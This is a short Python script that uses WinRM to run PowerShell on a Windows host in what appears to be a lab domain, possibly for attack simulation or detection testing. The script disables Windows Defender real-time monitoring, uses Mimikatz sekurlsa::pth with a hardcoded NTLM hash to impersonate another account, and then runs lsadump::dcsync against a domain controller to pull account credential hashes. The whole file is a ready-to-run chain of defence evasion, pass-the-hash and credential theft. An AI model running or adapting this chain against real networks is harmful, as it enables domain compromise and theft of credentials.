"""Run Mimikatz DCSync with explicit DC IP."""
import winrm, datetime

HOST = '192.168.50.17'
USER = 'vagrant'
PASS = 'vagrant'

s = winrm.Session(HOST, auth=(USER, PASS), transport='ntlm')
s.run_ps('Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue')

ts = datetime.datetime.now(datetime.UTC)
print(f"TIMESTAMP: {ts.strftime('%Y-%m-%dT%H:%M:%S')}Z")
print("Braco A: Mimikatz DCSync com dcsync2 via win10\n")

# Need to authenticate as dcsync2. Option 1: runas /netonly simulation
# Option 2: use Mimikatz PTH to inject dcsync2 creds, then dcsync

# First: inject dcsync2 credentials via sekurlsa::pth
# Then: run lsadump::dcsync with explicit DC IP
ps = r'''
$mimi = "C:\Users\vagrant\Desktop\mimikatz\x64\mimikatz.exe"
$hash = "383fe399326a954a97f73781553ae73d"

# Step 1: Inject dcsync2 credentials
$args1 = 'privilege::debug "sekurlsa::pth /user:dcsync2 /domain:WINDOMAIN2025 /ntlm:' + $hash + '" exit'
$p = Start-Process -FilePath $mimi -ArgumentList $args1 -NoNewWindow -Wait -PassThru -RedirectStandardOutput C:\Users\vagrant\Desktop\mimi_step1.txt
Write-Host "Step1 exit: $($p.ExitCode)"
Get-Content C:\Users\vagrant\Desktop\mimi_step1.txt

# Step 2: DCSync with explicit DC
$args2 = '"lsadump::dcsync /domain:windomain2025.local /user:vagrant /dc:192.168.50.9" exit'
$p2 = Start-Process -FilePath $mimi -ArgumentList $args2 -NoNewWindow -Wait -PassThru -RedirectStandardOutput C:\Users\vagrant\Desktop\mimi_step2.txt
Write-Host "Step2 exit: $($p2.ExitCode)"
Get-Content C:\Users\vagrant\Desktop\mimi_step2.txt
'''
r = s.run_ps(ps)
print(r.std_out.decode())
if r.std_err:
    err = r.std_err.decode()
    for line in err.split('\n'):
        if any(x in line.lower() for x in ['ntlm', 'hash', 'dcsync', 'error', 'fail']):
            print("STDERR:", line[:200])
